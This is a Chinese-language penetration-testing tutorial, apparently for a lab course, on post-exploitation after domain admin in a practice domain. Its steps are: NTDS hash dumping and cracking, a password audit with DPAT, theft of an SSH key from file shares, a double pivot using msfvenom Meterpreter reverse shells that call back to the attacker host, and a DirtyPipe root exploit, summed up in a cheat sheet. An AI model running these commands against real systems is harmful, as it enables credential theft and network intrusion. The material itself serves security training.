## 學習目標

- 用 DPAT 對傾印的 NTDS 進行網域密碼分析，量化密碼強度問題。
- 在取得 DA 後搜尋敏感檔案共享，展示存取影響範圍。
- 建立雙重轉進鏈（攻擊機 → dmz01 → DC01 → MGMT01）以存取隔離管理網路。
- 利用 DirtyPipe（CVE-2022-0847）對 Linux 主機進行本地提權至 root。

## 理論基礎

```text
取得 DA 後的目標：
  → 不只是「拿到 DA 就結束」 → 展示真實影響範圍才能提供客戶價值
  → 四個主要後滲透操作：
      1. 密碼分析      → 量化組織密碼強度問題（DPAT + NTDS dump）
      2. 敏感資料搜尋  → 展示 DA 可存取的業務敏感資料
      3. 轉進至隔離網路 → 驗證「DA 不應直接存取管理網路」是否成立
      4. Linux 提權    → 存取「皇冠上的寶石」伺服器

網路拓樸（本章攻擊鏈）：
  攻擊主機（10.10.14.15）
    └─ dmz01（172.16.8.120，對外 DMZ 主機）
        └─ DC01（172.16.8.3，網域控制器）
            └─ MGMT01（172.16.9.25，隔離管理網路）
```

## 一、網域密碼分析（DPAT）

### 理論

```text
DPAT（Domain Password Audit Tool）：
  → 對 NTDS dump + Hashcat 破解結果進行統計分析
  → 產生可放入報告附錄的視覺化圖表與指標
  → 強化「允許弱 AD 密碼」發現的說服力

配合工具：
  → secretsdump.py → 傾印 NTDS
  → Hashcat        → 離線破解
  → DPAT           → 分析破解結果並產生報告

報告指標（DPAT 輸出）：
  → 取得的密碼雜湊數量
  → 已破解的密碼雜湊數量
  → 已破解的密碼雜湊百分比
  → 前 10 大常用密碼
  → 密碼長度分佈
  → 已破解的網域管理員密碼數量
  → 已破解的企業管理員（Enterprise Admin）密碼數量
```

```bash
# 步驟一：傾印 NTDS（已有 DA 憑證）
secretsdump.py INLANEFREIGHT.LOCAL/administrator@172.16.8.3 -just-dc-ntlm -outputfile ntds_hashes
# → 輸出 ntds_hashes.ntds（格式：username:RID:LM:NT:::）

# 步驟二：用 Hashcat 暴力破解
hashcat -m 1000 ntds_hashes.ntds /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# -m 1000 → NTLM 雜湊模式
# 破解結果寫入 ntds_hashes.ntds.pot（或 ~/.hashcat/hashcat.potfile）

# 步驟三：DPAT 密碼分析（需 Python 2）
python dpat.py -n ntds_hashes.ntds -c ~/.hashcat/hashcat.potfile -g
# -n → NTDS 雜湊檔
# -c → Hashcat potfile（已破解的雜湊:明文）
# -g → 產生圖表（HTML 報告）
# 輸出：stats.html（含分佈圖）+ 摘要統計

# 步驟四：DPAT 也可以直接解析 secretsdump 輸出
python dpat.py -n ntds_hashes.ntds -c hashcat.potfile --dc-ip 172.16.8.3
```

## 二、敏感資料搜尋

### 理論

```text
取得 DA 後的檔案共享搜尋：
  → DA 通常可存取網域中幾乎所有資源
  → 目標：找出高敏感度資料，展示存取影響（而非複製資料）
  → 報告原則：只截取檔案列表截圖，不開啟個別檔案，不從網路移除任何檔案

高價值目錄：
  → HR（薪資、獎金資料）
  → Finance（財務資訊）
  → R&D（研發機密）
  → IT\Private（SSH 私鑰、設定檔、腳本）
  → Executives（高管資訊）

高敏感度發現的應對：
  → IT\Private\Networking → SSH 私鑰 → 可能是進入隔離網路的憑證
  → 腳本目錄 → 可能含有硬編碼密碼（之前 backup.ps1 案例）
```

```powershell
# 透過 evil-winrm 瀏覽 Department Shares（已取得 DA）
*Evil-WinRM* PS C:\> dir

# 輸出：Department Shares / PerfLogs / Program Files / Users / Windows

*Evil-WinRM* PS C:\> cd "Department Shares"
*Evil-WinRM* PS C:\Department Shares> dir
# 輸出：Accounting / Executives / Finance / HR / IT / Marketing / R&D

# 進入 IT\Private
*Evil-WinRM* PS C:\Department Shares\IT\Private> ls
# 輸出：Development / Networking

# 查看 Networking 目錄（發現 SSH 私鑰）
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> ls
# 發現：ssmallsadm-id_rsa、其他使用者的 SSH 私鑰
# → 私鑰檔名包含使用者名稱 → 推測可 SSH 到某主機

# 確認 DC 有第二張網卡（指向隔離管理網路）
*Evil-WinRM* PS C:\> ipconfig /all
# Ethernet0: 172.16.8.3  → 主網域網路
# Ethernet1: 172.16.9.3  → 172.16.9.0/23 管理網路
# → DC 是進入管理網路的橋樑

# 掃描管理網路存活主機（PowerShell ping sweep）
1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
# 結果：172.16.9.3 = True（DC 自身）/ 172.16.9.25 = True（MGMT01）

# 下載 SSH 私鑰到攻擊機（evil-winrm download）
download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa
# Info: Download successful!
```

## 三、雙重轉進至 MGMT01

### 理論

```text
雙重轉進鏈：
  攻擊機（10.10.14.15）→ dmz01（172.16.8.120）→ DC01（172.16.8.3）→ MGMT01（172.16.9.25）

轉進思路：
  → 第一跳（dmz01）：已有 Meterpreter shell（前幾章建立）
  → 第二跳（DC01）：evil-winrm 可控，但 DC 無法直接回連攻擊機
  → 解法：
      a. dmz01 建立反向連接埠轉發（:1234 → 攻擊機:8443）
      b. msfvenom 在 DC 上執行 → 連回 dmz01:1234 → 轉發到攻擊機:8443
      c. 取得 DC Meterpreter → autoroute 172.16.9.0/23
      d. SOCKS proxy → proxychains SSH 到 MGMT01

關鍵概念：
  portfwd -R → 反向轉發（在 Meterpreter session 中執行，dmz01 監聽）
  autoroute   → 在 MSF 中設定路由，讓攻擊機流量透過 DC Meterpreter 到達管理網路
  socks_proxy → MSF auxiliary，讓 proxychains 工具透過 autoroute 路由
```

```bash
# ─── 步驟一：在 dmz01 Meterpreter 設定反向連接埠轉發 ───

# 重新取得 dmz01 Meterpreter（若已斷線，重新上傳 shell.elf 並執行）
# Metasploit handler 設定：
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 10.10.14.15
set LPORT 443
exploit
# 在 dmz01 執行 ./shell.elf → 取得 Meterpreter session 1

# 設定反向連接埠轉發：dmz01:1234 → 攻擊機:8443
(Meterpreter 1) > portfwd add -R -l 8443 -p 1234 -L 10.10.14.15
# -R     → 反向轉發（Reverse）
# -l 8443 → 攻擊機的監聽埠（local）
# -p 1234 → dmz01 監聽的埠（remote）
# -L 10.10.14.15 → 攻擊機 IP
# 效果：DC 連到 dmz01:1234 → 流量導向攻擊機:8443
```

```bash
# ─── 步驟二：製作 Windows Meterpreter 酬載並上傳到 DC ───

# 製作 Windows x64 Meterpreter（LHOST 為 dmz01 IP，LPORT 為 1234）
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.16.8.120 \
  LPORT=1234 \
  -f exe -o dc_shell.exe
# LHOST=172.16.8.120 → DC 回連目標為 dmz01（中繼點）
# LPORT=1234         → dmz01 的監聽埠（會被轉發到攻擊機:8443）

# 透過 evil-winrm 上傳到 DC
*Evil-WinRM* PS C:\> upload "/home/tester/dc_shell.exe"
# Info: Upload successful!
```

```bash
# ─── 步驟三：在攻擊機啟動第二個 handler（等待 DC 回連）───

# 背景化 session 1
(Meterpreter 1) > bg

# 啟動第二個 handler，監聽 8443（接收從 dmz01 轉發來的 DC 流量）
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0   # 監聽所有介面
set lport 8443
exploit

# 在 DC 執行酬載
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc_shell.exe

# handler 接收到連線：
# [*] Meterpreter session 2 opened (10.10.14.15:8443 -> 10.10.14.15:46313)
# → 連線顯示來自 10.10.14.15（自身）因為是本地轉發
(Meterpreter 2) > getuid
# Server username: INLANEFREIGHT\Administrator
(Meterpreter 2) > sysinfo
# Computer: DC01 / OS: Windows 2016+ / Domain: INLANEFREIGHT
```

```bash
# ─── 步驟四：設定 autoroute 到管理網路 ───

(Meterpreter 2) > run autoroute -s 172.16.9.0/23
# [+] Added route to 172.16.9.0/255.255.254.0 via 10.10.14.15

(Meterpreter 2) > background

# 確認路由表
route print
# IPv4 Active Routing Table:
# Subnet: 172.16.9.0 / Netmask: 255.255.254.0 / Gateway: Session 2
```

```bash
# ─── 步驟五：啟動 SOCKS Proxy ───

use auxiliary/server/socks_proxy
set srvport 9050
set version 4a   # 相容 proxychains 預設格式
run              # 背景執行

# 確認 /etc/proxychains.conf 末尾有：
# socks4 127.0.0.1 9050

# 測試路由是否通（掃描 MGMT01 的 22 埠）
proxychains nmap -sT -p 22 172.16.9.25
# PORT   STATE SERVICE
# 22/tcp open  ssh
# → 確認可透過 proxychains 到達 MGMT01
```

```bash
# ─── 步驟六：SSH 登入 MGMT01 ───

# 設定 SSH 私鑰權限
chmod 600 /tmp/ssmallsadm-id_rsa

# 以 ssmallsadm 身份 SSH 登入 MGMT01（透過 proxychains）
proxychains ssh -i /tmp/ssmallsadm-id_rsa ssmallsadm@172.16.9.25
# |S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:22-<><>-OK
# Welcome to Ubuntu 20.04.3 LTS...
# → 成功登入 MGMT01（Ubuntu 20.04.3，172.16.9.25）
```

## 四、DirtyPipe 本地提權（CVE-2022-0847）

### 理論

```text
DirtyPipe（CVE-2022-0847）：
  → Linux 核心 pipe 機制的記憶體覆寫漏洞
  → 允許無特權使用者覆寫任意唯讀檔案（包含 SUID 二進位檔）
  → 影響核心版本：5.8 ～ 5.16.11 / 5.15.25 / 5.10.102 之前
  → 攻擊方式：inject into a SUID binary → 執行 → 取得 root shell

利用前提：
  → 需要一個 SUID 二進位檔作為注入目標
  → 使用 exploit-2（需指定 SUID 二進位路徑）

參考：
  → GitHub: AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits（exploit-2）
  → HackTheBox blog 有詳細技術解說
```

```bash
# 步驟一：確認核心版本是否受影響
uname -a
# Linux MGMT01 5.10.0-051000-generic #202012132330 SMP ... x86_64
# 5.10.0 → 在 5.10.102 之前 → 受 DirtyPipe 影響

# 步驟二：建立 exploit 程式碼（Vim 貼入 exploit-2 原始碼）
vim dirtypipe.c
# 貼入 CVE-2022-0847 exploit-2 的 C 原始碼

# 步驟三：編譯
gcc dirtypipe.c -o dirtypipe
# gcc 系統已安裝 → 直接編譯

chmod +x dirtypipe

# 步驟四：搜尋 SUID 二進位檔
find / -perm -4000 2>/dev/null
# 輸出包含：
# /usr/lib/openssh/ssh-keysign  ← 目標
# /usr/bin/pkexec
# /usr/bin/passwd
# /usr/bin/chsh
# /usr/bin/fusermount
# 等...

# 步驟五：對 ssh-keysign 執行 exploit
./dirtypipe /usr/lib/openssh/ssh-keysign
# [+] hijacking suid binary..
# [+] dropping suid shell..
# [+] restoring suid binary..
# [+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# # id
# uid=0(root) gid=0(root) groups=0(root),1001(ssmallsadm)
# → 成功取得 root shell

# 清理：exploit 執行後 /tmp/sh 殘留 shell 檔
rm /tmp/sh
```

## 五、Exfiltration 模擬與 Domain Trust 後續

```text
資料竊取（Exfiltration）模擬：
  → 部分客戶想測試 DLP（資料外洩防護）能力
  → 使用「模擬資料」而非真實敏感資料
  → 嘗試各種竊取方法（HTTP/DNS/SMB/ICMP 隧道）並觀察是否觸發告警
  → 與客戶事先確認：目標資料類型、允許的竊取方法、測試範圍

Domain Trust 後續：
  → 若環境中存在 domain trust → 列舉並嘗試：
      → 子網域 → 父網域（ExtraSids，見 78B 章）
      → 跨樹系 Kerberoasting（見 78C、78D 章）
      → 跨樹系外部群組成員（管理員密碼重用）
  → 前提：與客戶確認目標 domain 是否在測試範圍內
  → 價值：即使當前 domain 已良好強化，信任的合作夥伴 domain 可能是弱點
```

## 速查表

```bash
# DPAT 密碼分析
python dpat.py -n ntds_hashes.ntds -c hashcat.potfile -g

# PowerShell ping sweep
1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}

# evil-winrm 下載 SSH 私鑰
download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa

# Metasploit 反向連接埠轉發（dmz01 Meterpreter）
portfwd add -R -l 8443 -p 1234 -L 10.10.14.15

# msfvenom Windows 酬載
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 LPORT=1234 -f exe -o dc_shell.exe

# autoroute + SOCKS proxy
run autoroute -s 172.16.9.0/23
use auxiliary/server/socks_proxy; set srvport 9050; set version 4a; run

# proxychains 掃描 + SSH
proxychains nmap -sT -p 22 172.16.9.25
proxychains ssh -i /tmp/ssmallsadm-id_rsa ssmallsadm@172.16.9.25

# SUID 搜尋
find / -perm -4000 2>/dev/null

# DirtyPipe
gcc dirtypipe.c -o dirtypipe && chmod +x dirtypipe
./dirtypipe /usr/lib/openssh/ssh-keysign
```
